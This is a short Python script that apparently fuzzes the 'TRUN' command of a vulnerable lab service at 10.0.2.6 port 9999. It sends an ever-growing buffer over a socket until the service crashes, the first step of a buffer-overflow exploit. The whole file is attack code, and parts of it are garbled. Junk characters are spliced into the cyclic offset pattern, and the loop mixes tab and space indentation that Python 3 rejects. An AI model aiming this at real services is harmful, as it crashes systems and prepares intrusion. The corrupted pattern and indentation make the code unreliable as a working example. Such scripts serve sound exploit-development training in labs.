#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0AgBb1Bb2fe5f4s5d8ds4fw458sad12Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc01i6At6At7At8At9Au0Au1Au2Au3Au4Au4d5sa4ew8f5ewsagr5e4e2r12e1r545f1s21f5s45f15r1f5e1gr21g21e5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bdf6w5"

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('10.0.2.6', 9999))
        payload = b'TRUN /.:/' + buffer
        sock.send(payload)
        sock.close()
		sleep(1)
		buffer += b"A" * 100
    except:
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
        sys.exit()